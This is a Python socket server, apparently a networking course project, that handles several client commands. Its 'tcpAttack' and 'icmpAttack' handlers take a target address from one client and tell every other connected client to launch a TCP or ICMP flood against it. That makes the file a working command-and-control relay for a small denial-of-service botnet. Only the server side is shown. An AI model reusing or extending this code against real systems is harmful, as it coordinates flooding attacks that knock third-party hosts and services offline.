# written by Jack Pistagnesi

import socket
from _thread import *
import time

#List of connections relating to different threads
connections = []
ThreadCount = 0
hasJobSeeker = False

#create server socket
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#get host name
name = socket.gethostname()
print("The name of the host is: "+name)

#get ip of host
ip = socket.gethostbyname(name)
print("The IP of the host is: "+ip)

#opening up a connection to the server
port = 4321
adrs = (ip,port)
server.bind(adrs)
server.listen(1)
print("Started listening on ",ip,":",port)


#Function used when creating threads for connections with different clients
def cThread(client, connectionList):
    #continuous communication until client closes the connection
    while 1:
        data = client.recv(1024)
        data=data.decode('ascii', 'strict')

        print("Received",data,"from the client.")
        print("Processing...")

        if data=="quit":
            msg = "Connection Closed."
            client.send(msg.encode('ascii', 'strict'))
            client.close()
            print("Connection Closed.")
            break

        elif data=="ipcheck":
            print("")
            msg = "Host is online. Enter another message or job or type 'quit' to disconnect this client."
            msg2 = "Host is offline. Enter another message or job or type 'quit' to disconnect this client."
            if ip == socket.gethostbyname(name):
                client.send(msg.encode('ascii', 'strict'))

            else:
                client.send(msg2.encode('ascii', 'strict'))
                print("reply sent.")

        elif data=="portstatus":
            msg3 = "Port is listening. Enter another message or job or type 'quit' to disconnect this client."
            msg4 = "Port is closed. Enter another message or job or type 'quit' to disconnect this client."
            if ip == socket.gethostbyname(name) and port == 4321:
                client.send(msg3.encode('ascii', 'strict'))
            else:
                client.send(msg4.encode('ascii', 'strict'))
                print("reply sent.")

        elif data =="tcpAttack":
            data1 = client.recv(1024)
            data2 = client.recv(1024)
            data1=data1.decode('ascii', 'strict')
            targetPort = data1
            data2=data2.decode('ascii', 'strict')
            targetAddress = data2
            #Tell every connected job seeker to start a TCP flood attack on the given IP/Port
            xNum = 0
            for x in connectionList:
                xNum += 1
                try:
                    msg = "tcpAttack"
                    x.send(msg.encode('ascii','strict'))
                    time.sleep(1)
                    x.send(targetPort.encode('ascii','strict'))
                    time.sleep(1)
                    x.send(targetAddress.encode('ascii','strict'))
                except:
                    pass
            print("TCP Attack data sent") 

        elif data =="icmpAttack":
            data1 = client.recv(1024)
            data1 = data1.decode('ascii', 'strict')
            targetAddress = data1
            #Tell every connected job seeker to start a TCP flood attack on the given IP/Port
            for x in connectionList:
                msg = "icmpAttack"
                x.send(msg.encode('ascii','strict'))
                time.sleep(1)
                x.send(targetAddress.encode('ascii','strict'))
            print("ICMP attack data sent") 

        else:
            print("Message received. Thank you. Enter another message or job or type 'quit' to disconnect this client")
            msg1="Message received. Thank you"
            client.send(msg1.encode('ascii','strict'))
            print("reply sent.")

#Constantly listen for new clients. When a new client is found it is sent to a new thread in the funtion above.
while 1:
    client,addr = server.accept()
    connections.append(client)
    print("Obtained a Connection from ",addr[0]," : ",addr[1])
    start_new_thread(cThread,(client,connections))
    ThreadCount = ThreadCount + 1
    print("Number of Connections: " + str(ThreadCount))
server.close()
